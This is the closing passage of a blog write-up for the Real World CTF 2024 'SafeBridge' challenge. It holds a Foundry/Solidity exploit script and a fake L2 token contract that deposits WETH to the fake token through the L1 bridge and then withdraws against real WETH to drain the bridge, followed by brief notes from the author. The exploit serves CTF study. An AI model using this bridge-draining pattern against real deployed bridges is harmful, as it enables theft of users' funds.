        <span class="n">console2</span><span class="p">.</span><span class="n">log</span><span class="p">(</span><span class="s">"l1Bridge"</span><span class="p">,</span> <span class="kt">address</span><span class="p">(</span><span class="n">l1Bridge</span><span class="p">));</span>
        <span class="n">console2</span><span class="p">.</span><span class="n">log</span><span class="p">(</span><span class="s">"weth"</span><span class="p">,</span> <span class="kt">address</span><span class="p">(</span><span class="n">weth</span><span class="p">));</span>
    <span class="p">}</span>
    <span class="k">function</span> <span class="n">create_fake</span><span class="p">()</span> <span class="k">public</span> <span class="p">{</span>
        <span class="n">vm</span><span class="p">.</span><span class="n">startBroadcast</span><span class="p">();</span>
        <span class="n">weth</span> <span class="o">=</span> <span class="n">WETH</span><span class="p">(</span><span class="k">payable</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">vm</span><span class="p">.</span><span class="n">envAddress</span><span class="p">(</span><span class="s">"WETH"</span><span class="p">))));</span>
        <span class="n">console2</span><span class="p">.</span><span class="n">log</span><span class="p">(</span><span class="s">"weth"</span><span class="p">,</span><span class="kt">address</span><span class="p">(</span><span class="n">weth</span><span class="p">));</span>
        <span class="n">fake</span> <span class="o">=</span> <span class="k">new</span> <span class="n">L2Fake</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">weth</span><span class="p">),</span><span class="s">"fake"</span><span class="p">,</span><span class="s">"fake"</span><span class="p">);</span>
        <span class="n">console2</span><span class="p">.</span><span class="n">log</span><span class="p">(</span><span class="s">"fake"</span><span class="p">,</span><span class="kt">address</span><span class="p">(</span><span class="n">fake</span><span class="p">));</span>
        <span class="n">vm</span><span class="p">.</span><span class="n">stopBroadcast</span><span class="p">();</span>
    <span class="p">}</span>
    <span class="k">function</span> <span class="n">run_send_to_fake</span><span class="p">()</span> <span class="k">public</span> <span class="p">{</span>
        <span class="n">vm</span><span class="p">.</span><span class="n">startBroadcast</span><span class="p">();</span>
        <span class="n">weth</span> <span class="o">=</span> <span class="n">WETH</span><span class="p">(</span><span class="k">payable</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">vm</span><span class="p">.</span><span class="n">envAddress</span><span class="p">(</span><span class="s">"WETH"</span><span class="p">))));</span>
        <span class="n">l1Bridge</span> <span class="o">=</span> <span class="n">L1ERC20Bridge</span><span class="p">(</span><span class="n">vm</span><span class="p">.</span><span class="n">envAddress</span><span class="p">(</span><span class="s">"L1_BRIDGE"</span><span class="p">));</span>
        <span class="n">fake</span> <span class="o">=</span> <span class="n">L2Fake</span><span class="p">(</span><span class="n">vm</span><span class="p">.</span><span class="n">envAddress</span><span class="p">(</span><span class="s">"FAKE"</span><span class="p">));</span>
        <span class="n">console2</span><span class="p">.</span><span class="n">log</span><span class="p">(</span><span class="s">"address(weth)"</span><span class="p">,</span><span class="kt">address</span><span class="p">(</span><span class="n">weth</span><span class="p">));</span>
        <span class="n">console2</span><span class="p">.</span><span class="n">log</span><span class="p">(</span><span class="s">"address(l1Bridge)"</span><span class="p">,</span><span class="kt">address</span><span class="p">(</span><span class="n">l1Bridge</span><span class="p">));</span>
        <span class="n">console2</span><span class="p">.</span><span class="n">log</span><span class="p">(</span><span class="s">"address(fake)"</span><span class="p">,</span><span class="kt">address</span><span class="p">(</span><span class="n">fake</span><span class="p">));</span>
        <span class="n">weth</span><span class="p">.</span><span class="n">deposit</span><span class="p">{</span><span class="n">value</span><span class="o">:</span> <span class="mi">2</span> <span class="kc">ether</span><span class="p">}();</span>
        <span class="n">weth</span><span class="p">.</span><span class="n">approve</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">l1Bridge</span><span class="p">),</span> <span class="mi">2</span> <span class="kc">ether</span><span class="p">);</span>
        <span class="n">l1Bridge</span><span class="p">.</span><span class="n">depositERC20</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">weth</span><span class="p">),</span> <span class="kt">address</span><span class="p">(</span><span class="n">fake</span><span class="p">),</span> <span class="mi">2</span> <span class="kc">ether</span><span class="p">);</span>
        <span class="n">console2</span><span class="p">.</span><span class="n">log</span><span class="p">(</span><span class="s">"user:weth"</span><span class="p">,</span><span class="n">weth</span><span class="p">.</span><span class="n">balanceOf</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">l1Bridge</span><span class="p">)));</span>
    <span class="p">}</span>
    <span class="k">function</span> <span class="n">run_withdraw</span><span class="p">()</span> <span class="k">public</span> <span class="p">{</span>
        <span class="n">vm</span><span class="p">.</span><span class="n">startBroadcast</span><span class="p">();</span>
        <span class="n">fake</span> <span class="o">=</span> <span class="n">L2Fake</span><span class="p">(</span><span class="n">vm</span><span class="p">.</span><span class="n">envAddress</span><span class="p">(</span><span class="s">"FAKE"</span><span class="p">));</span>
        <span class="n">console2</span><span class="p">.</span><span class="n">log</span><span class="p">(</span><span class="s">"address(fake)"</span><span class="p">,</span><span class="kt">address</span><span class="p">(</span><span class="n">fake</span><span class="p">));</span>
        <span class="n">L2ERC20Bridge</span> <span class="n">l2Bridge</span> <span class="o">=</span> <span class="n">L2ERC20Bridge</span><span class="p">(</span><span class="n">Lib_PredeployAddresses</span><span class="p">.</span><span class="n">L2_ERC20_BRIDGE</span><span class="p">);</span>
        <span class="n">console2</span><span class="p">.</span><span class="n">log</span><span class="p">(</span><span class="s">"address(l2Bridge)"</span><span class="p">,</span><span class="kt">address</span><span class="p">(</span><span class="n">l2Bridge</span><span class="p">));</span>
        <span class="n">l2Bridge</span><span class="p">.</span><span class="n">withdraw</span><span class="p">(</span><span class="n">Lib_PredeployAddresses</span><span class="p">.</span><span class="n">L2_WETH</span><span class="p">,</span> <span class="mi">2</span> <span class="kc">ether</span><span class="p">);</span>
        <span class="n">console2</span><span class="p">.</span><span class="n">log</span><span class="p">(</span><span class="s">"address(l2Bridge)"</span><span class="p">,</span><span class="kt">address</span><span class="p">(</span><span class="n">l2Bridge</span><span class="p">));</span>
        <span class="n">console2</span><span class="p">.</span><span class="n">log</span><span class="p">(</span><span class="s">"address(l2Bridge)"</span><span class="p">,</span><span class="kt">address</span><span class="p">(</span><span class="n">l2Bridge</span><span class="p">.</span><span class="n">l1TokenBridge</span><span class="p">()));</span>
        <span class="n">l2Bridge</span><span class="p">.</span><span class="n">withdraw</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">fake</span><span class="p">),</span> <span class="mi">2</span> <span class="kc">ether</span><span class="p">);</span>
        <span class="n">console2</span><span class="p">.</span><span class="n">log</span><span class="p">(</span><span class="s">"address(l2Bridge)"</span><span class="p">,</span><span class="kt">address</span><span class="p">(</span><span class="n">l2Bridge</span><span class="p">));</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="k">contract</span> <span class="n">L2Fake</span> <span class="k">is</span> <span class="n">IL2StandardERC20</span><span class="p">,</span> <span class="n">ERC20</span> <span class="p">{</span>
    <span class="kt">address</span> <span class="k">public</span> <span class="n">l1Token</span><span class="p">;</span>

    <span class="k">constructor</span><span class="p">(</span><span class="kt">address</span> <span class="n">_l1Token</span><span class="p">,</span> <span class="kt">string</span> <span class="k">memory</span> <span class="n">_name</span><span class="p">,</span> <span class="kt">string</span> <span class="k">memory</span> <span class="n">_symbol</span><span class="p">)</span> <span class="n">ERC20</span><span class="p">(</span><span class="n">_name</span><span class="p">,</span> <span class="n">_symbol</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">l1Token</span> <span class="o">=</span> <span class="n">_l1Token</span><span class="p">;</span>
        <span class="n">_mint</span><span class="p">(</span><span class="n">msg</span><span class="p">.</span><span class="n">sender</span><span class="p">,</span> <span class="mi">3</span> <span class="kc">ether</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="k">function</span> <span class="n">supportsInterface</span><span class="p">(</span><span class="kt">bytes4</span> <span class="n">_interfaceId</span><span class="p">)</span> <span class="k">public</span> <span class="k">pure</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span><span class="p">)</span> <span class="p">{</span>
        <span class="kt">bytes4</span> <span class="n">firstSupportedInterface</span> <span class="o">=</span> <span class="kt">bytes4</span><span class="p">(</span><span class="nb">keccak256</span><span class="p">(</span><span class="s">"supportsInterface(bytes4)"</span><span class="p">));</span> <span class="c1">// ERC165
</span>        <span class="kt">bytes4</span> <span class="n">secondSupportedInterface</span> <span class="o">=</span>
            <span class="n">IL2StandardERC20</span><span class="p">.</span><span class="n">l1Token</span><span class="p">.</span><span class="nb">selector</span> <span class="o">^</span> <span class="n">IL2StandardERC20</span><span class="p">.</span><span class="n">mint</span><span class="p">.</span><span class="nb">selector</span> <span class="o">^</span> <span class="n">IL2StandardERC20</span><span class="p">.</span><span class="n">burn</span><span class="p">.</span><span class="nb">selector</span><span class="p">;</span>
        <span class="k">return</span> <span class="n">_interfaceId</span> <span class="o">==</span> <span class="n">firstSupportedInterface</span> <span class="o">||</span> <span class="n">_interfaceId</span> <span class="o">==</span> <span class="n">secondSupportedInterface</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">function</span> <span class="n">mint</span><span class="p">(</span><span class="kt">address</span> <span class="n">_to</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">_amount</span><span class="p">)</span> <span class="k">public</span> <span class="p">{</span>
        <span class="n">_mint</span><span class="p">(</span><span class="n">_to</span><span class="p">,</span> <span class="n">_amount</span><span class="p">);</span>

        <span class="k">emit</span> <span class="n">Mint</span><span class="p">(</span><span class="n">_to</span><span class="p">,</span> <span class="n">_amount</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="k">function</span> <span class="n">burn</span><span class="p">(</span><span class="kt">address</span> <span class="n">_from</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">_amount</span><span class="p">)</span> <span class="k">public</span> <span class="p">{</span>
        <span class="n">_burn</span><span class="p">(</span><span class="n">_from</span><span class="p">,</span> <span class="n">_amount</span><span class="p">);</span>

        <span class="k">emit</span> <span class="n">Burn</span><span class="p">(</span><span class="n">_from</span><span class="p">,</span> <span class="n">_amount</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></table></code></div></div><h3 id="considerations"><strong>Considerations</strong><a href="#considerations" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><ul><li>I’m not much familiar with foundry so I executed each function one by one, changing the L2 and L1 rpc accordingly. So I couldn’t shared variables so I manually updated environment variables per call.<li>Deploying an attacker contract seems like a more efficient to writing the code.<li>The last <strong><code class="language-plaintext highlighter-rouge">run_withdraw</code></strong> function couldn’t run in foundry due to its use of a precompiled address. I should called withdraw function using cast</ul></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/ctf/'>CTF</a>, <a href='/categories/web3/'>WEB3</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/writeup/" class="post-tag no-text-decoration" >writeup</a> <a href="/tags/web3/" class="post-tag no-text-decoration" >web3</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=(CTF) realworld CTF 2024 writeup (SafeBridge) - snwo&url=http://blog.solidity.kr/posts/(ctf)-2024-realworldctf/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=(CTF) realworld CTF 2024 writeup (SafeBridge) - snwo&u=http://blog.solidity.kr/posts/(ctf)-2024-realworldctf/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=(CTF) realworld CTF 2024 writeup (SafeBridge) - snwo&url=http://blog.solidity.kr/posts/(ctf)-2024-realworldctf/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recent Update</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/(ctf)-sonic-jailbreak-hackathon/">(CTF) Sonic Jailbreak hackathon writeup</a><li><a href="/posts/(ctf)-bi0s-ctf-2025/">(CTF) bi0s CTF 2025 writeup (blockchains)</a><li><a href="/posts/(ctf)-2024-eth-escape-ctf/">(CTF) ETH Escape CTF 2024 writeup (Feel, Vest, MAZE)</a><li><a href="/posts/(ctf)-2024-blazCTF/">(CTF) blazCTF 2024 writeup (Chisel as a Service, teragas)</a><li><a href="/posts/(ctf)-2024-SekaiCTF/">(CTF) SekaiCTF 2024 writeup (ZOO)</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/writeup/">writeup</a> <a class="post-tag" href="/tags/web3/">web3</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/(ctf)-2024-justCTF/"><div class="card-body"> <em class="timeago small" date="2024-06-16 17:02:13 +0900" >Jun 16, 2024</em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>(CTF) justCTF 2024 writeup (Blockchains)</h3><div class="text-muted small"><p> It was first time for me to solve move based challenge. Solved 3 blockchain challenges, World of Ottercraft, The Otter Scrolls, Dark BrOTTERhood ( all move based challenge ) The Otter Scrolls Al...</p></div></div></a></div><div class="card"> <a href="/posts/(ctf)-2024-SekaiCTF/"><div class="card-body"> <em class="timeago small" date="2024-08-27 05:02:13 +0900" >Aug 27, 2024</em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>(CTF) SekaiCTF 2024 writeup (ZOO)</h3><div class="text-muted small"><p> I made solidity assembly challenge in sekai ctf 2024. ended up with 13 solves. you can check the detail here ZOO welcome to assembly zoo There are two functions, fallback and commit (interna...</p></div></div></a></div><div class="card"> <a href="/posts/(ctf)-2024-blazCTF/"><div class="card-body"> <em class="timeago small" date="2024-09-27 05:02:13 +0900" >Sep 27, 2024</em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>(CTF) blazCTF 2024 writeup (Chisel as a Service, teragas)</h3><div class="text-muted small"><p> I played blaz CTF as KimchiPremium, had a lot of fun with the awesome kimchi hackers Chisel as a Service Chisel as a Service Mina just develops a highly robust Solidity sandbox! Connect to ...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/(ctf)-2023-corctf/" class="btn btn-outline-primary" prompt="Older"><p>(CTF) corCTF 2023 writeup (diophantus,babyWallet,utterly-tangled)</p></a> <a href="/posts/(ctf)-2024-justCTF/" class="btn btn-outline-primary" prompt="Newer"><p>(CTF) justCTF 2024 writeup (Blockchains)</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2025 <a href="https://twitter.com/snwo_kr">snwo</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/writeup/">writeup</a> <a class="post-tag" href="/tags/web3/">web3</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><script src="https://cdn.jsdelivr.net/npm/mermaid@8/dist/mermaid.min.js"></script> <script> $(function() { function updateMermaid(event) { if (event.source === window && event.data && event.data.direction === ModeToggle.ID) { const mode = event.data.message; if (typeof mermaid === "undefined") { return; } let expectedTheme = (mode === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* Re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } let initTheme = "default"; if ($("html[mode=dark]").length > 0 || ($("html[mode]").length == 0 && window.matchMedia("(prefers-color-scheme: dark)").matches ) ) { initTheme = "dark"; } let mermaidConf = { theme: initTheme /* <default|dark|forest|neutral> */ }; /* Markdown converts to HTML */ $("pre").has("code.language-mermaid").each(function() { let svgCode = $(this).children().html(); $(this).addClass("unloaded"); $(this).after(`<div class=\"mermaid\">${svgCode}</div>`); }); mermaid.initialize(mermaidConf); window.addEventListener("message", updateMermaid); }); </script><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script> /* see: <https://docs.mathjax.org/en/latest/options/input/tex.html#tex-options> */ MathJax = { tex: { inlineMath: [ /* start/end delimiter pairs for in-line math */ ['$','$'], ['\\(','\\)'] ], displayMath: [ /* start/end delimiter pairs for display math */ ['$$', '$$'], ['\\[', '\\]'] ] } }; </script> <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script> <script type="text/javascript" id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js"> </script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-H9FVY2NFPZ"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-H9FVY2NFPZ'); }); </script>
